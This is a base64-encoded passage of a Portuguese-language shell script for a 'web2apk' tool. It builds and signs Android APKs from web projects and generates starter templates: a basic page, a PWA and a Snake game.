xvYWRXaXRoT3ZlcnZpZXdNb2RlKHRydWUpOwogICAgICAgIHcuc2V0V2ViVmlld0NsaWVudChuZXcgV2ViVmlld0NsaWVudCgpKTsKICAgICAgICB3LmxvYWRVcmwoIiRKQVZBX0xPQUQiKTsKICAgIH0KICAgIEBPdmVycmlkZSBwdWJsaWMgdm9pZCBvbkJhY2tQcmVzc2VkKCkgeyBpZiAody5jYW5Hb0JhY2soKSkgdy5nb0JhY2soKTsgZWxzZSBzdXBlci5vbkJhY2tQcmVzc2VkKCk7IH0KICAgIEBPdmVycmlkZSBwcm90ZWN0ZWQgdm9pZCBvblJlc3VtZSgpIHsgc3VwZXIub25SZXN1bWUoKTsgdy5vblJlc3VtZSgpOyB9CiAgICBAT3ZlcnJpZGUgcHJvdGVjdGVkIHZvaWQgb25QYXVzZSgpICB7IHN1cGVyLm9uUGF1c2UoKTsgIHcub25QYXVzZSgpOyAgfQp9CkpBVkFFT0YKCiAgIyDilIDilIAgUGlwZWxpbmUg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgX2luZm8gJ2FhcHQyIGNvbXBpbGUuLi4nCiAgYWFwdDIgY29tcGlsZSAtLWRpciAiJEJVSUxEL3JlcyIgLW8gIiRCVUlMRC9yZXNfY29tcGlsZWQvIiAyPiYxIFwKICAgIHwgZ3JlcCAtdiAnXiQnIHwgd2hpbGUgSUZTPSByZWFkIC1yIGw7IGRvIF9kaW0gIiRsIjsgZG9uZQoKICBfaW5mbyAnYWFwdDIgbGluay4uLicKICBhYXB0MiBsaW5rIC0tbWFuaWZlc3QgIiRCVUlMRC9BbmRyb2lkTWFuaWZlc3QueG1sIiBcCiAgICAtSSAiJFcyQV9KQVIiIC1BICIkQlVJTEQvYXNzZXRzIiBcCiAgICAiJEJVSUxEL3Jlc19jb21waWxlZC8iKi5mbGF0IFwKICAgIC1vICIkQlVJTEQvdW5zaWduZWQuYXBrIiAyPiYxIFwKICAgIHwgZ3JlcCAtdiAnXiQnIHwgd2hpbGUgSUZTPSByZWFkIC1yIGw7IGRvIF9kaW0gIiRsIjsgZG9uZQogIFsgLWYgIiRCVUlMRC91bnNpZ25lZC5hcGsiIF0gfHwgX2VyciAnYWFwdDIgbGluayBmYWxob3UnCgogIF9pbmZvICdDb21waWxhbmRvIEphdmEuLi4nCiAgbG9jYWwgSkFWQV9DT01QSUxFUgogIGlmICAgY29tbWFuZCAtdiBlY2ogICAgPi9kZXYvbnVsbCAyPiYxOyB0aGVuIEpBVkFfQ09NUElMRVI9J2VjaicKICBlbGlmIGNvbW1hbmQgLXYgamF2YWMgID4vZGV2L251bGwgMj4mMTsgdGhlbiBKQVZBX0NPTVBJTEVSPSdqYXZhYycKICBlbHNlIF9lcnIgJ0NvbXBpbGFkb3IgSmF2YSBuYW8gZW5jb250cmFkby4gSW5zdGFsZTogcGtnIGluc3RhbGwgZWNqJzsgZmkKICBfZGltICJVc2FuZG86ICRKQVZBX0NPTVBJTEVSIgogIGlmIFsgIiRKQVZBX0NPTVBJTEVSIiA9ICdlY2onIF07IHRoZW4KICAgIGVjaiAtc291cmNlIDcgLXRhcmdldCA3IC1jcCAiJFcyQV9KQVIiIFwKICAgICAgIiRCVUlMRC9zcmMvJFBLR19QQVRIL1dlYkFjdGl2aXR5LmphdmEiIFwKICAgICAgLWQgIiRCVUlMRC9jbGFzc2VzLyIgMj4mMSBcCiAgICAgIHwgZ3JlcCAtdiAnXiQnIHwgd2hpbGUgSUZTPSByZWFkIC1yIGw7IGRvIF9kaW0gIiRsIjsgZG9uZQogIGVsc2UKICAgIGphdmFjIC1zb3VyY2UgNyAtdGFyZ2V0IDcgLWNwICIkVzJBX0pBUiIgXAogICAgICAiJEJVSUxEL3NyYy8kUEtHX1BBVEgvV2ViQWN0aXZpdHkuamF2YSIgXAogICAgICAtZCAiJEJVSUxEL2NsYXNzZXMvIiAyPiYxIFwKICAgICAgfCBncmVwIC12ICdeJCcgfCB3aGlsZSBJRlM9IHJlYWQgLXIgbDsgZG8gX2RpbSAiJGwiOyBkb25lCiAgZmkKICBbIC1mICIkQlVJTEQvY2xhc3Nlcy8kUEtHX1BBVEgvV2ViQWN0aXZpdHkuY2xhc3MiIF0gfHwgX2VyciAnY29tcGlsYWNhbyBKYXZhIGZhbGhvdScKCiAgX2luZm8gJ2R4ICguY2xhc3MgLT4gLmRleCkuLi4nCiAgZHggLS1kZXggLS1vdXRwdXQ9IiRCVUlMRC9jbGFzc2VzLmRleCIgIiRCVUlMRC9jbGFzc2VzLyIgMj4mMSBcCiAgICB8IGdyZXAgLXYgJ14kJyB8IHdoaWxlIElGUz0gcmVhZCAtciBsOyBkbyBfZGltICIkbCI7IGRvbmUKICBbIC1mICIkQlVJTEQvY2xhc3Nlcy5kZXgiIF0gfHwgX2VyciAnZHggZmFsaG91JwoKICBfaW5mbyAnRW1wYWNvdGFuZG8gREVYLi4uJwogIChjZCAiJEJVSUxEIiAmJiB6aXAgLWogdW5zaWduZWQuYXBrIGNsYXNzZXMuZGV4KSA+IC9kZXYvbnVsbAoKICBfaW5mbyAnemlwYWxpZ24uLi4nCiAgemlwYWxpZ24gLWYgNCAiJEJVSUxEL3Vuc2lnbmVkLmFwayIgIiRCVUlMRC9hbGlnbmVkLmFwayIgMj4vZGV2L251bGwKCiAgX2Vuc3VyZV9rZXlzdG9yZQogIGxvY2FsIEtTX0FMSUFTIEtTX1BBU1MKICBpZiBbICIkVzJBX0tTIiA9ICIkSE9NRS8ueHBtL3Rvb2xzL2Fwa3Rvb2wveHBtLWNvbXBhdC10ZXN0LmtleXN0b3JlIiBdOyB0aGVuCiAgICBLU19BTElBUz0neHBtLWNvbXBhdC10ZXN0JzsgS1NfUEFTUz0neHBtLWNvbXBhdC10ZXN0JwogIGVsc2UKICAgIEtTX0FMSUFTPSd3ZWIyYXBrJzsgS1NfUEFTUz0nd2ViMmFway1rZXknCiAgZmkKCiAgX2luZm8gJ2Fwa3NpZ25lci4uLicKICBhcGtzaWduZXIgc2lnbiBcCiAgICAtLWtzICIkVzJBX0tTIiAtLWtzLWtleS1hbGlhcyAiJEtTX0FMSUFTIiBcCiAgICAtLWtzLXBhc3MgcGFzczoiJEtTX1BBU1MiIC0ta2V5LXBhc3MgcGFzczoiJEtTX1BBU1MiIFwKICAgIC0tb3V0ICIkT1VUX0FQSyIgIiRCVUlMRC9hbGlnbmVkLmFwayIgMj4mMSBcCiAgICB8IGdyZXAgLXYgJ14kJyB8IHdoaWxlIElGUz0gcmVhZCAtciBsOyBkbyBfZGltICIkbCI7IGRvbmUKICBbIC1mICIkT1VUX0FQSyIgXSB8fCBfZXJyICdhcGtzaWduZXIgZmFsaG91JwoKICBsb2NhbCBBUEtfU0laRTsgQVBLX1NJWkU9JChkdSAtaCAiJE9VVF9BUEsiIHwgY3V0IC1mMSkKICBwcmludGYgJ1xuXDAzM1sxOzMybSAgPT0gQVBLIHByb250byA9PVwwMzNbMG1cblxuJwogIF9vayAiQXJxdWl2byAgOiAkT1VUX0FQSyAoJEFQS19TSVpFKSIKICBfb2sgIlBhY2thZ2UgIDogJFBLR19OQU1FIgogIF9vayAiVmVyc2FvICAgOiAkVkVSU0lPTl9OQU1FICgkVkVSU0lPTl9DT0RFKSIKICBwcmludGYgJ1xuJwogIF9kaW0gIkluc3RhbGFyIDogdGVybXV4LW9wZW4gJyRPVVRfQVBLJyIKICBwcmludGYgJ1xuJwp9CgpfY21kX3RlbXBsYXRlKCkgewogIGxvY2FsIFRUWVBFPSIkezE6LX0iIE9VVERJUj0iJHsyOi19IgoKICAjIOKUgOKUgCBNZW51IGludGVyYXRpdm8gc2UgbsOjbyBmb2kgcGFzc2FkbyB0aXBvIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogIGlmIFsgLXogIiRUVFlQRSIgXTsgdGhlbgogICAgcHJpbnRmICJcblwwMzNbMTszNW0gIHdlYjJhcGsgdGVtcGxhdGUg4oCUIEdlcmFyIHByb2pldG8gZGUgZXhlbXBsb1wwMzNbMG1cblxuIgogICAgcHJpbnRmICIgIFwwMzNbMTszMm0xKVwwMzNbMG0gYmFzaWMgICDigJQgSFRNTCArIENTUyArIEpTIHNpbXBsZXMgKGJvYSBwYXJhIGNvbWXDp2FyKVxuIgogICAgcHJpbnRmICIgIFwwMzNbMTszMm0yKVwwMzNbMG0gcHdhICAgICDigJQgUHJvZ3Jlc3NpdmUgV2ViIEFwcCAob2ZmbGluZSwgaW5zdGFsbMOhdmVsKVxuIgogICAgcHJpbnRmICIgIFwwMzNbMTszMm0zKVwwMzNbMG0gZ2FtZSAgICDigJQgSm9nbyBjYW52YXMgc2ltcGxlcyAoU25ha2UpXG4iCiAgICBwcmludGYgIiAgXDAzM1sxOzMybTQpXDAzM1swbSBibGFuayAgIOKAlCBFc3F1ZWxldG8gbcOtbmltbyBzZW0gY29udGXDumRvXG5cbiIKICAgIHByaW50ZiAiICBUaXBvIFsxLTQgb3Ugbm9tZV06ICIKICAgIHJlYWQgLXIgVFRZUEUKICAgIGNhc2UgIiRUVFlQRSIgaW4KICAgICAgMSkgVFRZUEU9ImJhc2ljIiAgOzsKICAgICAgMikgVFRZUEU9InB3YSIgICAgOzsKICAgICAgMykgVFRZUEU9ImdhbWUiICAgOzsKICAgICAgNCkgVFRZUEU9ImJsYW5rIiAgOzsKICAgIGVzYWMKICBmaQoKICBbIC16ICIkT1VURElSIiBdICYmIE9VVERJUj0iLi8ke1RUWVBFfWFwcCIKCiAgaWYgWyAtZCAiJE9VVERJUiIgXSAmJiBbICIkKGxzIC1BICIkT1VURElSIiAyPi9kZXYvbnVsbCkiIF07IHRoZW4KICAgIHByaW50ZiAiXDAzM1sxOzMzbSAgRGlyZXTDs3JpbyAnJXMnIGrDoSBleGlzdGUgZSBuw6NvIGVzdMOhIHZhemlvLlwwMzNbMG1cbiIgIiRPVVRESVIiCiAgICBwcmludGYgIiAgQ29udGludWFyIG1lc21vIGFzc2ltPyBbcy9OXSAiCiAgICByZWFkIC1yIHJlc3AKICAgIFsgIiRyZXNwIiA9ICJzIiBdIHx8IFsgIiRyZXNwIiA9ICJTIiBdIHx8IHsgcHJpbnRmICIgIENhbmNlbGFkby5cblxuIjsgZXhpdCAwOyB9CiAgZmkKCiAgbWtkaXIgLXAgIiRPVVRESVIiCgogIGNhc2UgIiRUVFlQRSIgaW4KICAgIGJhc2ljKSAgX3RwbF9iYXNpYyAgIiRPVVRESVIiIDs7CiAgICBwd2EpICAgIF90cGxfcHdhICAgICIkT1VURElSIiA7OwogICAgZ2FtZSkgICBfdHBsX2dhbWUgICAiJE9VVERJUiIgOzsKICAgIGJsYW5rKSAgX3RwbF9ibGFuayAgIiRPVVRESVIiIDs7CiAgICAqKQogICAgICBwcmludGYgIlwwMzNbMTszMW0gIFRlbXBsYXRlIGRlc2NvbmhlY2lkbzogJXNcMDMzWzBtXG4iICIkVFRZUEUiCiAgICAgIHByaW50ZiAiICBPcMOnw7VlczogYmFzaWMgfCBwd2EgfCBnYW1lIHwgYmxhbmtcblxuIgogICAgICBleGl0IDEgOzsKICBlc2FjCgogIHByaW50ZiAiXG5cMDMzWzE7MzJtICBQcm9qZXRvIGNyaWFkbyBlbTogJXNcMDMzWzBtXG4iICIkT1VURElSIgogIHByaW50ZiAiXDAzM1swOzkwbSAgVGVzdGFyIG5vIGJyb3dzZXIgOiB0ZXJtdXgtb3BlbiAnJXMvaW5kZXguaHRtbCdcMDMzWzBtXG4iICIkT1VURElSIgogIHByaW50ZiAiXDAzM1swOzkwbSAgQnVpbGRhciBBUEsgICAgICAgOiB3ZWIyYXBrIGJ1aWxkICclcycgLS1uYW1lIFwiJXNcIlwwMzNbMG1cblxuIiAiJE9VVERJUiIgIiRUVFlQRSIKfQoKIyDilIDilIAgYmFzaWMg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACl90cGxfYmFzaWMoKSB7CiAgbG9jYWwgRD0iJDEiCiAgY2F0ID4gIiREL2luZGV4Lmh0bWwiIDw8ICdIVE1MJwo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0icHQtQlIiPgo8aGVhZD4KICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAsIHVzZXItc2NhbGFibGU9bm8iPgogIDx0aXRsZT5NZXUgQXBwPC90aXRsZT4KICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9InN0eWxlLmNzcyI+CjwvaGVhZD4KPGJvZHk+CiAgPGhlYWRlcj4KICAgIDxoMSBpZD0iYXBwLXRpdGxlIj5NZXUgQXBwPC9oMT4KICA8L2hlYWRlcj4KICA8bWFpbj4KICAgIDxkaXYgY2xhc3M9ImNhcmQiPgogICAgICA8cD5PbMOhISBFc3RlIMOpIHVtIHRlbXBsYXRlIGLDoXNpY28gZ2VyYWRvIHBlbG8gPHN0cm9uZz53ZWIyYXBrPC9zdHJvbmc+LjwvcD4KICAgICAgPHAgaWQ9ImNvdW50ZXItbGFiZWwiPlZvY8OqIGNsaWNvdSA8c3BhbiBpZD0iY291bnQiPjA8L3NwYW4+IHZleihlcykuPC9wPgogICAgICA8YnV0dG9uIGlkPSJidG4iPkNsaXF1ZSBhcXVpPC9idXR0b24+CiAgICA8L2Rpdj4KICAgIDxkaXYgY2xhc3M9ImNhcmQiIGlkPSJpbmZvLWNhcmQiPgogICAgICA8cCBpZD0iaW5mby10ZXh0Ij5BZ3VhcmRhbmRvIGludGVyYcOnw6NvLi4uPC9wPgogICAgPC9kaXY+CiAgPC9tYWluPgogIDxzY3JpcHQgc3JjPSJzY3JpcHQuanMiPjwvc2NyaXB0Pgo8L2JvZHk+CjwvaHRtbD4KSFRNTAoKICBjYXQgPiAiJEQvc3R5bGUuY3NzIiA8PCAnQ1NTJwo6cm9vdCB7CiAgLS1iZzogICAgICAjMGYxMTE3OwogIC0tc3VyZmFjZTogIzFhMWQyNzsKICAtLWFjY2VudDogICMxYTczZTg7CiAgLS10ZXh0OiAgICAjZThlYWYwOwogIC0tbXV0ZWQ6ICAgIzhhOGZhODsKICAtLXJhZGl1czogIDE0cHg7Cn0KKiB7IGJveC1zaXppbmc6IGJvcmRlci1ib3g7IG1hcmdpbjogMDsgcGFkZGluZzogMDsgfQpib2R5IHsKICBiYWNrZ3JvdW5kOiB2YXIoLS1iZyk7CiAgY29sb3I6IHZhcigtLXRleHQpOwogIGZvbnQtZmFtaWx5OiBzeXN0ZW0tdWksIHNhbnMtc2VyaWY7CiAgbWluLWhlaWdodDogMTAwdmg7CiAgZGlzcGxheTogZmxleDsKICBmbGV4LWRpcmVjdGlvbjogY29sdW1uOwp9CmhlYWRlciB7CiAgYmFja2dyb3VuZDogdmFyKC0tc3VyZmFjZSk7CiAgcGFkZGluZzogMThweCAyMHB4OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBib3JkZXItYm90dG9tOiAxcHggc29saWQgIzJhMmQzYTsKfQpoZWFkZXIgaDEgeyBmb250LXNpemU6IDEuNHJlbTsgY29sb3I6IHZhcigtLWFjY2VudCk7IH0KbWFpbiB7CiAgZmxleDogMTsKICBwYWRkaW5nOiAyMHB4OwogIGRpc3BsYXk6IGZsZXg7CiAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsKICBnYXA6IDE2cHg7CiAgbWF4LXdpZHRoOiA1MDBweDsKICBtYXJnaW46IDAgYXV0bzsKICB3aWR0aDogMTAwJTsKfQouY2FyZCB7CiAgYmFja2dyb3VuZDogdmFyKC0tc3VyZmFjZSk7CiAgYm9yZGVyLXJhZGl1czogdmFyKC0tcmFkaXVzKTsKICBwYWRkaW5nOiAyMHB4OwogIGJvcmRlcjogMXB4IHNvbGlkICMyYTJkM2E7Cn0KLmNhcmQgcCB7IGNvbG9yOiB2YXIoLS1tdXRlZCk7IGxpbmUtaGVpZ2h0OiAxLjY7IG1hcmdpbi1ib3R0b206IDEwcHg7IH0KLmNhcmQgcDpsYXN0LWNoaWxkIHsgbWFyZ2luLWJvdHRvbTogMDsgfQpzcGFuI2NvdW50IHsgY29sb3I6IHZhcigtLWFjY2VudCk7IGZvbnQtd2VpZ2h0OiBib2xkOyB9CmJ1dHRvbiB7CiAgbWFyZ2luLXRvcDogMTJweDsKICBiYWNrZ3JvdW5kOiB2YXIoLS1hY2NlbnQpOwogIGNvbG9yOiAjZmZmOwogIGJvcmRlcjogbm9uZTsKICBib3JkZXItcmFkaXVzOiAxMHB4OwogIHBhZGRpbmc6IDEycHggMjhweDsKICBmb250LXNpemU6IDFyZW07CiAgY3Vyc29yOiBwb2ludGVyOwogIHdpZHRoOiAxMDAlOwogIHRyYW5zaXRpb246IG9wYWNpdHkgLjE1czsKfQpidXR0b246YWN0aXZlIHsgb3BhY2l0eTogLjc1OyB9CkNTUwoKICBjYXQgPiAiJEQvc2NyaXB0LmpzIiA8PCAnSlMnCid1c2Ugc3RyaWN0JzsKCmNvbnN0IGJ0biAgID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2J0bicpOwpjb25zdCBjb3VudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjb3VudCcpOwpjb25zdCBpbmZvICA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpbmZvLXRleHQnKTsKbGV0IG4gPSAwOwoKYnRuLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4gewogIG4rKzsKICBjb3VudC50ZXh0Q29udGVudCA9IG47CiAgY29uc3QgbXNncyA9IFsKICAgICdGdW5jaW9uYW5kbyBubyBBbmRyb2lkISDwn5qAJywKICAgICdXZWJWaWV3IHJvZGFuZG8gbGlzbyDwn46vJywKICAgICd3ZWIyYXBrIG5vIHRyYWJhbGhvISDimqEnLAogICAgJ0FQSyBwcm9udG8gcHJhIGRpc3RyaWJ1aXIg8J+TpicsCiAgICAnVm9jw6ogw6kgZmVyYSEgJyArIG4gKyAnIGNsaXF1ZXMhJwogIF07CiAgaW5mby50ZXh0Q29udGVudCA9IG1zZ3NbTWF0aC5taW4obiAtIDEsIG1zZ3MubGVuZ3RoIC0gMSldOwp9KTsKSlMKfQoKIyDilIDilIAgcHdhIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgApfdHBsX3B3YSgpIHsKICBsb2NhbCBEPSIkMSIKICAjIFJlYXByb3ZlaXRhIG8gdmlzdWFsIGRvIGJhc2ljIGUgYWRpY2lvbmEgbWFuaWZlc3QgKyBzdwogIF90cGxfYmFzaWMgIiREIgoKICAjIFNvYnJlc2NyZXZlIG8gPGhlYWQ+IGRvIGluZGV4Lmh0bWwgcGFyYSBhZGljaW9uYXIgbWFuaWZlc3QKICBzZWQgLWkgJ3N8PHRpdGxlPk1ldSBBcHA8L3RpdGxlPnw8dGl0bGU+TWV1IFBXQTwvdGl0bGU+XG4gIDxsaW5rIHJlbD0ibWFuaWZlc3QiIGhyZWY9Im1hbmlmZXN0Lmpzb24iPlxuICA8bWV0YSBuYW1lPSJ0aGVtZS1jb2xvciIgY29udGVudD0iIzFhNzNlOCI+fCcgIiREL2luZGV4Lmh0bWwiCiAgc2VkIC1pICdzfDxoMSBpZD0iYXBwLXRpdGxlIj5NZXUgQXBwPC9oMT58PGgxIGlkPSJhcHAtdGl0bGUiPk1ldSBQV0E8L2gxPnwnICIkRC9pbmRleC5odG1sIgogIHNlZCAtaSAnc3w8L2JvZHk+fCAgPHNjcmlwdD5pZigic2VydmljZVdvcmtlciJpbiBuYXZpZ2F0b3IpbmF2aWdhdG9yLnNlcnZpY2VXb3JrZXIucmVnaXN0ZXIoInN3LmpzIik8L3NjcmlwdD5cbjwvYm9keT58JyAiJEQvaW5kZXguaHRtbCIKCiAgY2F0ID4gIiREL21hbmlmZXN0Lmpzb24iIDw8ICdKU09OJwp7CiAgIm5hbWUiOiAiTWV1IFBXQSIsCiAgInNob3J0X25hbWUiOiAiUFdBIiwKICAic3RhcnRfdXJsIjogIi4iLAogICJkaXNwbGF5IjogInN0YW5kYWxvbmUiLAogICJiYWNrZ3JvdW5kX2NvbG9yIjogIiMwZjExMTciLAogICJ0aGVtZV9jb2xvciI6ICIjMWE3M2U4IiwKICAiaWNvbnMiOiBbCiAgICB7ICJzcmMiOiAiaWNvbi0xOTIucG5nIiwgInNpemVzIjogIjE5MngxOTIiLCAidHlwZSI6ICJpbWFnZS9wbmciIH0sCiAgICB7ICJzcmMiOiAiaWNvbi01MTIucG5nIiwgInNpemVzIjogIjUxMng1MTIiLCAidHlwZSI6ICJpbWFnZS9wbmciIH0KICBdCn0KSlNPTgoKICBjYXQgPiAiJEQvc3cuanMiIDw8ICdTVycKY29uc3QgQ0FDSEUgPSAncHdhLXYxJzsKY29uc3QgQVNTRVRTID0gWycvJywgJy9pbmRleC5odG1sJywgJy9zdHlsZS5jc3MnLCAnL3NjcmlwdC5qcycsICcvbWFuaWZlc3QuanNvbiddOwoKc2VsZi5hZGRFdmVudExpc3RlbmVyKCdpbnN0YWxsJywgZSA9PgogIGUud2FpdFVudGlsKGNhY2hlcy5vcGVuKENBQ0hFKS50aGVuKGMgPT4gYy5hZGRBbGwoQVNTRVRTKSkpKTsKCnNlbGYuYWRkRXZlbnRMaXN0ZW5lcignZmV0Y2gnLCBlID0+CiAgZS5yZXNwb25kV2l0aChjYWNoZXMubWF0Y2goZS5yZXF1ZXN0KS50aGVuKHIgPT4gciB8fCBmZXRjaChlLnJlcXVlc3QpKSkpOwpTVwp9CgojIOKUgOKUgCBnYW1lIChTbmFrZSkg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACl90cGxfZ2FtZSgpIHsKICBsb2NhbCBEPSIkMSIKICBjYXQgPiAiJEQvaW5kZXguaHRtbCIgPDwgJ0hUTUwnCjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJwdC1CUiI+CjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCwgdXNlci1zY2FsYWJsZT1ubyI+CiAgPHRpdGxlPlNuYWtlPC90aXRsZT4KICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9InN0eWxlLmNzcyI+CjwvaGVhZD4KPGJvZHk+CiAgPGgxPvCfkI0gU25ha2U8L2gxPgogIDxjYW52YXMgaWQ9ImMiIHdpZHRoPSIzMDAiIGhlaWdodD0iMzAwIj48L2NhbnZhcz4KICA8cCBpZD0ic2NvcmUiPlBvbnRvczogMDwvcD4KICA8ZGl2IGlkPSJkcGFkIj4KICAgIDxidXR0b24gZGF0YS1kPSJVUCI+4payPC9idXR0b24+CiAgICA8ZGl2PgogICAgICA8YnV0dG9uIGRhdGEtZD0iTEVGVCI+4peAPC9idXR0b24+CiAgICAgIDxidXR0b24gZGF0YS1kPSJSSUdIVCI+4pa2PC9idXR0b24+CiAgICA8L2Rpdj4KICAgIDxidXR0b24gZGF0YS1kPSJET1dOIj7ilrw8L2J1dHRvbj4KICA8L2Rpdj4KICA8c2NyaXB0IHNyYz0ic2NyaXB0LmpzIj48L3NjcmlwdD4KPC9ib2R5Pgo8L2h0bWw+CkhUTUwKCiAgY2F0ID4gIiREL3N0eWxlLmNzcyIgPDwgJ0NTUycKKiB7IGJveC1zaXppbmc6IGJvcmRlci1ib3g7IG1hcmdpbjogMDsgcGFkZGluZzogMDsgfQpib2R5IHsKICBiYWNrZ3JvdW5kOiAjMGYxMTE3OwogIGNvbG9yOiAjZThlYWYwOwogIGZvbnQtZmFtaWx5OiBzeXN0ZW0tdWksIHNhbnMtc2VyaWY7CiAgZGlzcGxheTogZmxleDsKICBmbGV4LWRpcmVjdGlvbjogY29sdW1uOwogIGFsaWduLWl0ZW1zOiBjZW50ZXI7CiAgcGFkZGluZzogMjBweCAxMHB4OwogIGdhcDogMTJweDsKICBtaW4taGVpZ2h0OiAxMDB2aDsKfQpoMSB7IGZvbnQtc2l6ZTogMS41cmVtOyBjb2xvcjogIzFhNzNlODsgfQpjYW52YXMgewogIGJvcmRlcjogMnB4IHNvbGlkICMxYTczZTg7CiAgYm9yZGVyLXJhZGl1czogOHB4OwogIHRvdWNoLWFjdGlvbjogbm9uZTsKfQojc2NvcmUgeyBjb2xvcjogIzhhOGZhODsgZm9udC1zaXplOiAxLjFyZW07IH0KI2RwYWQgIHsgZGlzcGxheTogZmxleDsgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsgYWxpZ24taXRlbXM6IGNlbnRlcjsgZ2FwOiA2cHg7IH0KI2RwYWQgZGl2IHsgZGlzcGxheTogZmxleDsgZ2FwOiA2cHg7IH0KI2RwYWQgYnV0dG9uIHsKICBiYWNrZ3JvdW5kOiAjMWExZDI3OwogIGJvcmRlcjogMXB4IHNvbGlkICMyYTJkM2E7CiAgYm9yZGVyLXJhZGl1czogMTBweDsKICBjb2xvcjogI2U4ZWFmMDsKICBmb250LXNpemU6IDEuNHJlbTsKICB3aWR0aDogNTZweDsgaGVpZ2h0OiA1NnB4OwogIGN1cnNvcjogcG9pbnRlcjsKfQojZHBhZCBidXR0b246YWN0aXZlIHsgYmFja2dyb3VuZDogIzFhNzNlODsgfQpDU1MKCiAgY2F0ID4gIiREL3NjcmlwdC5qcyIgPDwgJ0pTJwondXNlIHN0cmljdCc7CmNvbnN0IGNhbnZhcyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjJyk7CmNvbnN0IGN0eCAgICA9IGNhbnZhcy5nZXRDb250ZXh0KCcyZCcpOwpjb25zdCBTWiA9IDE1LCBDT0xTID0gMjAsIFJPV1MgPSAyMDsKCmxldCBzbmFrZSwgZGlyLCBmb29kLCBzY29yZSwgcnVubmluZywgbG9vcDsKCmZ1bmN0aW9uIGluaXQoKSB7CiAgc25ha2UgICA9IFt7eDo1LCB5OjEwfSx7eDo0LHk6MTB9LHt4OjMseToxMH1dOwogIGRpciAgICAgPSB7eDoxLCB5OjB9OwogIGZvb2QgICAgPSBybmRGb29kKCk7CiAgc2NvcmUgICA9IDA7CiAgcnVubmluZyA9IHRydWU7CiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Njb3JlJykudGV4dENvbnRlbnQgPSAnUG9udG9zOiAwJzsKICBjbGVhckludGVydmFsKGxvb3ApOwogIGxvb3AgPSBzZXRJbnRlcnZhbCh0aWNrLCAxMzApOwp9CgpmdW5jdGlvbiBybmRGb29kKCkgewogIHJldHVybiB7IHg6IE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSpDT0xTKSwgeTogTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpKlJPV1MpIH07Cn0KCmZ1bmN0aW9uIHRpY2soKSB7CiAgY29uc3QgaGVhZCA9IHsgeDogc25ha2VbMF0ueCArIGRpci54LCB5OiBzbmFrZVswXS55ICsgZGlyLnkgfTsKICBpZiAoaGVhZC54IDwgMCB8fCBoZWFkLnggPj0gQ09MUyB8fCBoZWFkLnkgPCAwIHx8IGhlYWQueSA+PSBST1dTIHx8CiAgICAgIHNuYWtlLnNvbWUocyA9PiBzLnggPT09IGhlYWQueCAmJiBzLnkgPT09IGhlYWQueSkpIHsKICAgIGNsZWFySW50ZXJ2YWwobG9vcCk7CiAgICBydW5uaW5nID0gZmFsc2U7CiAgICBjdHguZmlsbFN0eWxlID0gJ3JnYmEoMCwwLDAsLjYpJzsKICAgIGN0eC5maWxsUmVjdCgwLDAsMzAwLDMwMCk7CiAgICBjdHguZmlsbFN0eW